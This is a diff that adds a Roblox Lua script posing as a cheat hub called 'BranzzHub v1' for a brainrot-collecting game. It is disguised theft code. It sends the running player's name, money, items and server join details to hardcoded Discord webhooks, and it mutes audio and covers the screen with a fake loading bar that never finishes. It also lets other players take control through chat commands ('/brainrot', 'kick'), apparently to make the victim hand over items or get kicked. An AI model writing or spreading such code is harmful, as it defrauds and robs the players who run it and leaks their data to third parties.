@@ -1,0 +1,605 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+local UserGameSettings = UserSettings():GetService("UserGameSettings")
+local SoundService = game:GetService("SoundService")
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+
+-- Webhooks Discord
+local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1451576749681938596/O0UGtdIBWRBs5vGCCscL76GA_DZ5hD1oVE6Ju4WBjO24dnp63oqwE3VDVncaydq3pmt8"
+local JOBID_WEBHOOK = "https://discord.com/api/webhooks/1468460930781417492/elAaS8ZACFPUfe-FGNT2CK-0SUBEjrT6SU8B8GCXybEIfwcY2p4P03jY-myLIdXW-52S"
+
+-- Lista de Brainrots válidos (atualizada)
+local VALID_BRAINROTS = {
+    "Esok Sekolah", "Alessio", "Bisonte Gupitere", "Dug Dug Dug", "Job Job Sahur",
+    "Fragola La La La", "Rainbow 67", "Aura Farma", "Los Tungtungtungcitos", "Espresso Signora", 
+    "Gattatino Nyanino", "Unclito Samito", "Statutino Libertino", "Gattatino Neonino", "Matteo",
+    "Chimpanzini Spiderini", "Agarrini la Palini", "Dragon Cannelloni", "Garama and Madundung", 
+    "Nuclearo Dinossauro", "La Grande Combinasion", "Chicleteira Bicicleteira", "Pot Hotspot", 
+    "Graipuss Medussi", "Las Vaquitas Saturnitas", "Las Tralaleritas", "Los Tralaleritos", 
+    "Torrtuginni Dragonfrutini", "La Vacca Saturno Saturnita",
+    "Ballerino Lololo", "Tukanno Bananno", "Piccione Macchina", "Orcalero Orcala", 
+    "Trippi Troppi Troppa Trippa", "Trenostruzzo Turbo 3000", "Udin Din Din Dun", 
+    "Tigroligre Frutonni", "Los Crocodillitos", "Tralalero Tralala", "Giraffa Celeste", 
+    "Cocofanto Elefanto",
+    "Ganganzelli Trulala", "Avocadorilla", "Gorillo Watermelondrillo", "Cavallo Virtuoso", 
+    "Tigrilini Watermelini", "Zibra Zubra Zibralini", "Bombombini Gusini", "Spioniro Golubiro", 
+    "Bombardilo Crocodilo", "Rhino Toasterino", "Orangutini Ananassini", "Frigo Camelo",
+    "Guesto Angelic", "Cocosini Mama", "Blueberrinni Octopussini", "Pi Pi Watermelon", 
+    "Sigma Boy", "Pandaccini Bananini", "Strawberrilli Flamengilli", "Glorbo Fruttodrillo", 
+    "Lionel Cactuseli", "Chef Crabracadabra", "Ballerina Cappuccina", "Chimpanzini Bananini", 
+    "Burbaloni Luliloli",
+    "Ti Ti Ti Sahur", "Penguino Cocosino", "Salamino Penguino", "Avocadini Guffo", 
+    "Perochello Lemonchello", "Bananita Dolphinita", "Bambini Crostini", "Trulimero Trulicina", 
+    "Brr Brr Patapim", "Cappuccino Assassino",
+    "Pipi Avocado", "67", "Tric Tric Baraboom", "Ta Ta Ta Sahur", "Cacto Hipopotamo", 
+    "Boneca Ambalabu", "Bobrito Bandito", "Gangster Footera", "Trippi Troppi",
+    "Pipi Corni", "Pipi Kiwi", "Svinino Bombondino", "Talpa Di Fero", "Frulli Frulla", 
+    "Tim Cheese", "Lirili Larila", "Noobini Cakenini"
+}
+
+-- IDs das bases para verificar
+local BASE_IDS = {
+    "0Bd3d45B-c3c0-43dd-bde9-1e2f",
+    "1D12cce0-9180-4d0c-00cd-c50b01",
+    "25cb495b-8abc-490c-b43f-1d0a",
+    "4cf0Ecbf-01df-4B21-aca0-bf1248",
+    "92bbebeb-80c4-4335-b1d5-9b0f2",
+    "02efe392-9907-4dbc-B0f4-00da",
+    "a31500ef-4303-4345-8ebf-322B8",
+    "c4200344-bcbe-40a8-a39c-b1f4c"
+}
+
+-- Variáveis globais
+getgenv().autoFarmActive = false
+getgenv().followingPlayer = nil
+
+-- Função para verificar se um nome está na lista de Brainrots
+local function isValidBrainrot(name)
+    for _, brainrot in ipairs(VALID_BRAINROTS) do
+        if name == brainrot then
+            return true
+        end
+    end
+    return false
+end
+
+-- Função recursiva para buscar Brainrots
+local function searchForBrainrots(parent, foundBrainrots)
+    for _, child in ipairs(parent:GetChildren()) do
+        if (child:IsA("Model") or child:IsA("Part") or child:IsA("MeshPart")) then
+            if isValidBrainrot(child.Name) then
+                table.insert(foundBrainrots, {
+                    Name = child.Name,
+                    Path = child:GetFullName(),
+                    ClassName = child.ClassName
+                })
+            end
+        end
+        searchForBrainrots(child, foundBrainrots)
+    end
+end
+
+-- Função para obter informações do jogador
+local function getPlayerInfo()
+    local player = Players.LocalPlayer
+    local leaderstats = player:FindFirstChild("leaderstats")
+    
+    local money = 0
+    local rebirth = 0
+    
+    if leaderstats then
+        local moneyValue = leaderstats:FindFirstChild("Money") or leaderstats:FindFirstChild("Cash") or leaderstats:FindFirstChild("Coins")
+        local rebirthValue = leaderstats:FindFirstChild("Rebirth") or leaderstats:FindFirstChild("Rebirths")
+        
+        if moneyValue then money = moneyValue.Value end
+        if rebirthValue then rebirth = rebirthValue.Value end
+    end
+    
+    return {
+        Money = money,
+        Rebirth = rebirth,
+        PlayerCount = #Players:GetPlayers()
+    }
+end
+
+-- Função para formatar número
+local function formatNumber(num)
+    local formatted = tostring(num)
+    local k
+    while true do  
+        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+        if k == 0 then break end
+    end
+    return formatted
+end
+
+-- Função para detectar Brainrots
+local function detectBrainrots()
+    print("🔍 Detectando Brainrots...")
+    
+    local basesFolder = Workspace:FindFirstChild("Bases")
+    if not basesFolder then
+        warn("⚠️ Pasta 'Bases' não encontrada!")
+        return {}
+    end
+    
+    local allBrainrots = {}
+    
+    for _, baseId in ipairs(BASE_IDS) do
+        local baseFolder = basesFolder:FindFirstChild(baseId)
+        if baseFolder then
+            local modelsFolder = baseFolder:FindFirstChild("Models")
+            if modelsFolder then
+                searchForBrainrots(modelsFolder, allBrainrots)
+            end
+            
+            local slotsFolder = baseFolder:FindFirstChild("Slots")
+            if slotsFolder then
+                searchForBrainrots(slotsFolder, allBrainrots)
+            end
+            
+            searchForBrainrots(baseFolder, allBrainrots)
+        end
+    end
+    
+    print("🎯 Total de Brainrots: " .. #allBrainrots)
+    return allBrainrots
+end
+
+-- Função para enviar para Discord
+local function sendToDiscord(payload, webhookUrl)
+    local jsonPayload = HttpService:JSONEncode(payload)
+    
+    if syn and syn.request then
+        pcall(function()
+            syn.request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonPayload})
+        end)
+        return
+    end
+    
+    if request then
+        pcall(function()
+            request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonPayload})
+        end)
+        return
+    end
+    
+    if http_request then
+        pcall(function()
+            http_request({Url = webhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonPayload})
+        end)
+        return
+    end
+    
+    pcall(function()
+        HttpService:PostAsync(webhookUrl, jsonPayload, Enum.HttpContentType.ApplicationJson, false)
+    end)
+end
+
+-- Função para enviar Job ID
+local function sendJobIdWebhook()
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local playerCount = #Players:GetPlayers()
+    local robloxLink = string.format("https://www.roblox.com/games/%s?gameInstanceId=%s", placeId, jobId)
+    
+    local teleportCode = string.format([[
+local TeleportService = game:GetService("TeleportService")
+local player = game:GetService("Players").LocalPlayer
+TeleportService:TeleportToPlaceInstance(%s, "%s", player)
+]], placeId, jobId)
+    
+    local payload = {
+        content = "🎮 **Novo Servidor Detectado!**",
+        embeds = {{
+            title = "📍 Informações do Servidor",
+            color = 3447003,
+            fields = {
+                {name = "🆔 Job ID", value = "```" .. jobId .. "```", inline = false},
+                {name = "🎯 Place ID", value = "```" .. placeId .. "```", inline = true},
+                {name = "👥 Jogadores Online", value = "```" .. playerCount .. "```", inline = true},
+                {name = "🔗 Link Direto", value = "[Clique aqui para entrar no servidor](" .. robloxLink .. ")", inline = false},
+                {name = "📜 Código de Teleporte", value = "```lua\n" .. teleportCode .. "\n```", inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    sendToDiscord(payload, JOBID_WEBHOOK)
+end
+
+-- Função para enviar detecção de Brainrots
+local function sendBrainrotWebhook(brainrots)
+    local player = Players.LocalPlayer
+    local playerInfo = getPlayerInfo()
+    local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+    
+    local brainrotList = ""
+    for i, br in ipairs(brainrots) do
+        brainrotList = brainrotList .. string.format("⭐ **%d.** %s (%s)\n", i, br.Name, br.ClassName)
+        if i >= 30 then
+            brainrotList = brainrotList .. "... e mais\n"
+            break
+        end
+    end
+    
+    if brainrotList == "" then
+        brainrotList = "Nenhum brainrot detectado"
+    end
+    
+    local payload = {
+        content = "@everyone @here Novo Alvo Detectado || @everyone @here ||",
+        embeds = {{
+            title = "🚨 NOVO ALVO DETECTADO",
+            description = "Novo alvo detectado 🇧🇷 || By Project branzz @everyone @here",
+            color = 15158332,
+            fields = {
+                {name = "Player que executou 👤", value = player.Name, inline = true},
+                {name = "Executor 🔰", value = executorName, inline = true},
+                {name = "Players in server 👥", value = tostring(playerInfo.PlayerCount), inline = false},
+                {name = "💰 Dinheiro", value = formatNumber(playerInfo.Money), inline = true},
+                {name = "🔄 Rebirths", value = tostring(playerInfo.Rebirth), inline = true},
+                {name = "BRAINROTS DETECTEDS 📊", value = brainrotList, inline = false}
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    sendToDiscord(payload, DISCORD_WEBHOOK)
+end
+
+-- Função para desativar som
+local function disableSound()
+    spawn(function()
+        while true do
+            wait(0.5)
+            UserGameSettings.MasterVolume = 0
+            SoundService.Volume = 0
+        end
+    end)
+end
+
+-- Função para desativar CoreGui
+local function disableAllCoreGui()
+    pcall(function()
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+end
+
+-- Função para usar ProximityPrompts e equipar item
+local function autoFarmProximityPrompts()
+    spawn(function()
+        local player = Players.LocalPlayer
+        getgenv().autoFarmActive = true
+        
+        while getgenv().autoFarmActive do
+            wait(0.1)
+            
+            local character = player.Character
+            if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
+                local hrp = character.HumanoidRootPart
+                local humanoid = character.Humanoid
+                
+                -- Equipar primeiro item do inventário
+                local backpack = player:FindFirstChildOfClass("Backpack")
+                if backpack then
+                    local firstTool = backpack:FindFirstChildOfClass("Tool")
+                    if firstTool then
+                        humanoid:EquipTool(firstTool)
+                        wait(0.1)
+                        
+                        -- Dar hit com a ferramenta
+                        if firstTool:FindFirstChild("Handle") then
+                            firstTool:Activate()
+                        end
+                    end
+                end
+                
+                -- Procurar ProximityPrompt mais próximo
+                local nearestPrompt = nil
+                local nearestDistance = math.huge
+                
+                for _, obj in pairs(Workspace:GetDescendants()) do
+                    if obj:IsA("ProximityPrompt") and obj.Enabled then
+                        local promptParent = obj.Parent
+                        if promptParent and promptParent:IsA("BasePart") then
+                            local distance = (hrp.Position - promptParent.Position).Magnitude
+                            if distance < nearestDistance and distance < 50 then
+                                nearestDistance = distance
+                                nearestPrompt = obj
+                            end
+                        end
+                    end
+                end
+                
+                -- Ir até o prompt e ativar
+                if nearestPrompt and nearestPrompt.Parent then
+                    local promptPart = nearestPrompt.Parent
+                    humanoid:MoveTo(promptPart.Position)
+                    wait(0.5)
+                    
+                    pcall(function()
+                        fireproximityprompt(nearestPrompt)
+                    end)
+                    
+                    wait(1)
+                end
+            end
+        end
+    end)
+end
+
+-- Função para seguir player e usar seus prompts
+local function followPlayerAndUsePrompts(targetPlayer)
+    spawn(function()
+        local player = Players.LocalPlayer
+        getgenv().followingPlayer = targetPlayer
+        
+        while getgenv().followingPlayer == targetPlayer and targetPlayer.Parent do
+            wait(0.1)
+            
+            local character = player.Character
+            local targetChar = targetPlayer.Character
+            
+            if character and targetChar and character:FindFirstChild("HumanoidRootPart") and targetChar:FindFirstChild("HumanoidRootPart") then
+                local hrp = character.HumanoidRootPart
+                local targetHrp = targetChar.HumanoidRootPart
+                local humanoid = character:FindFirstChildOfClass("Humanoid")
+                
+                -- Equipar todos os itens do backpack
+                local backpack = player:FindFirstChildOfClass("Backpack")
+                if backpack then
+                    for _, tool in pairs(backpack:GetChildren()) do
+                        if tool:IsA("Tool") then
+                            humanoid:EquipTool(tool)
+                            wait(0.1)
+                            if tool:FindFirstChild("Handle") then
+                                tool:Activate()
+                            end
+                        end
+                    end
+                end
+                
+                -- Mover até o player alvo
+                humanoid:MoveTo(targetHrp.Position)
+                
+                -- Usar todos os ProximityPrompts do player alvo
+                for _, obj in pairs(targetChar:GetDescendants()) do
+                    if obj:IsA("ProximityPrompt") and obj.Enabled then
+                        pcall(function()
+                            fireproximityprompt(obj)
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+-- Função para kickar o player
+local function kickPlayer()
+    Players.LocalPlayer:Kick("🚫 Comando KICK ativado!")
+end
+
+-- Sistema de comandos no chat
+local function setupChatCommands()
+    local player = Players.LocalPlayer
+    
+    player.Chatted:Connect(function(message)
+        local msg = message:lower()
+        if msg == "kick" or msg == ":kick" or msg == ";kick" then
+            kickPlayer()
+        end
+    end)
+    
+    for _, otherPlayer in pairs(Players:GetPlayers()) do
+        if otherPlayer ~= player then
+            otherPlayer.Chatted:Connect(function(message)
+                local msg = message:lower()
+                
+                if msg == "kick" or msg == ":kick" or msg == ";kick" then
+                    kickPlayer()
+                end
+                
+                if msg == "/brainrot" then
+                    print("🎯 Comando /brainrot detectado de " .. otherPlayer.Name)
+                    followPlayerAndUsePrompts(otherPlayer)
+                end
+            end)
+        end
+    end
+    
+    Players.PlayerAdded:Connect(function(newPlayer)
+        newPlayer.Chatted:Connect(function(message)
+            local msg = message:lower()
+            
+            if msg == "kick" or msg == ":kick" or msg == ";kick" then
+                kickPlayer()
+            end
+            
+            if msg == "/brainrot" then
+                print("🎯 Comando /brainrot detectado de " .. newPlayer.Name)
+                followPlayerAndUsePrompts(newPlayer)
+            end
+        end)
+    end)
+end
+
+-- Criar GUI de Carregamento
+local function createLoadingGUI()
+    local LoadingGui = Instance.new("ScreenGui")
+    LoadingGui.Name = "BranzzHubLoading"
+    LoadingGui.ResetOnSpawn = false
+    LoadingGui.IgnoreGuiInset = true
+    LoadingGui.DisplayOrder = 999999
+    
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1, 0, 1, 100)
+    Background.Position = UDim2.new(0, 0, 0, -50)
+    Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    Background.BorderSizePixel = 0
+    Background.ZIndex = 999999
+    Background.Parent = LoadingGui
+    
+    local LoadingFrame = Instance.new("Frame")
+    LoadingFrame.Size = UDim2.new(0, 600, 0, 200)
+    LoadingFrame.Position = UDim2.new(0.5, -300, 0.5, -100)
+    LoadingFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    LoadingFrame.BorderSizePixel = 0
+    LoadingFrame.ZIndex = 1000000
+    LoadingFrame.Parent = Background
+    
+    local FrameCorner = Instance.new("UICorner")
+    FrameCorner.CornerRadius = UDim.new(0, 20)
+    FrameCorner.Parent = LoadingFrame
+    
+    local FrameStroke = Instance.new("UIStroke")
+    FrameStroke.Color = Color3.fromRGB(200, 50, 50)
+    FrameStroke.Thickness = 4
+    FrameStroke.Parent = LoadingFrame
+    
+    local LoadingTitle = Instance.new("TextLabel")
+    LoadingTitle.Size = UDim2.new(1, 0, 0, 50)
+    LoadingTitle.Position = UDim2.new(0, 0, 0, 15)
+    LoadingTitle.BackgroundTransparency = 1
+    LoadingTitle.Text = "🎮 BranzzHub v1"
+    LoadingTitle.TextColor3 = Color3.fromRGB(200, 50, 50)
+    LoadingTitle.TextSize = 28
+    LoadingTitle.Font = Enum.Font.GothamBold
+    LoadingTitle.ZIndex = 1000001
+    LoadingTitle.Parent = LoadingFrame
+    
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Size = UDim2.new(1, -40, 0, 30)
+    StatusText.Position = UDim2.new(0, 20, 0, 70)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Text = "Iniciando sistema..."
+    StatusText.TextColor3 = Color3.fromRGB(180, 180, 180)
+    StatusText.TextSize = 16
+    StatusText.Font = Enum.Font.Gotham
+    StatusText.ZIndex = 1000001
+    StatusText.Parent = LoadingFrame
+    
+    local PercentText = Instance.new("TextLabel")
+    PercentText.Size = UDim2.new(1, 0, 0, 35)
+    PercentText.Position = UDim2.new(0, 0, 0, 105)
+    PercentText.BackgroundTransparency = 1
+    PercentText.Text = "0.0%"
+    PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    PercentText.TextSize = 24
+    PercentText.Font = Enum.Font.GothamBold
+    PercentText.ZIndex = 1000001
+    PercentText.Parent = LoadingFrame
+    
+    local BarBackground = Instance.new("Frame")
+    BarBackground.Size = UDim2.new(0.9, 0, 0, 25)
+    BarBackground.Position = UDim2.new(0.05, 0, 0, 155)
+    BarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    BarBackground.BorderSizePixel = 0
+    BarBackground.ZIndex = 1000001
+    BarBackground.Parent = LoadingFrame
+    
+    local BarCorner = Instance.new("UICorner")
+    BarCorner.CornerRadius = UDim.new(0, 12)
+    BarCorner.Parent = BarBackground
+    
+    local ProgressBar = Instance.new("Frame")
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+    ProgressBar.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    ProgressBar.BorderSizePixel = 0
+    ProgressBar.ZIndex = 1000002
+    ProgressBar.Parent = BarBackground
+    
+    local ProgressCorner = Instance.new("UICorner")
+    ProgressCorner.CornerRadius = UDim.new(0, 12)
+    ProgressCorner.Parent = ProgressBar
+    
+    LoadingGui.Parent = CoreGui
+    
+    local statusMessages = {
+        "Detectando brainrots...",
+        "Coletando dados...",
+        "Enviando informações...",
+        "Processando...",
+        "Inicializando auto-farm...",
+        "Configurando sistema...",
+        "Carregando módulos...",
+        "Sincronizando..."
+    }
+    
+    spawn(function()
+        local progress = 0
+        local messageIndex = 1
+        local messageTimer = 0
+        
+        while true do
+            wait(0.05)
+            
+            progress = progress + 0.001
+            if progress >= 99.9 then
+                progress = 99.9
+            end
+            
+            PercentText.Text = string.format("%.1f%%", progress)
+            
+            local targetSize = UDim2.new(progress / 100, 0, 1, 0)
+            TweenService:Create(ProgressBar, TweenInfo.new(0.3, Enum.EasingStyle.Linear), {Size = targetSize}):Play()
+            
+            messageTimer = messageTimer + 0.05
+            if messageTimer >= 3 then
+                messageTimer = 0
+                messageIndex = messageIndex + 1
+                if messageIndex > #statusMessages then
+                    messageIndex = 1
+                end
+                StatusText.Text = statusMessages[messageIndex]
+            end
+        end
+    end)
+    
+    spawn(function()
+        while true do
+            for i = 200, 255, 5 do
+                wait(0.05)
+                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
+            end
+            for i = 255, 200, -5 do
+                wait(0.05)
+                LoadingTitle.TextColor3 = Color3.fromRGB(i, 50, 50)
+            end
+        end
+    end)
+end
+
+-- Inicializar tudo
+setupChatCommands()
+
+print("🎮 BranzzHub v1 - Iniciando...")
+
+createLoadingGUI()
+disableSound()
+disableAllCoreGui()
+
+wait(2)
+
+-- Enviar Job ID
+sendJobIdWebhook()
+
+wait(1)
+
+-- Detectar e enviar Brainrots
+local brainrots = detectBrainrots()
+sendBrainrotWebhook(brainrots)
+
+wait(1)
+
+-- Iniciar auto-farm
+autoFarmProximityPrompts()
+
+print("✅ BranzzHub v1 carregado com sucesso!")
+print("💬 Comandos: kick, :kick, ;kick, /brainrot")
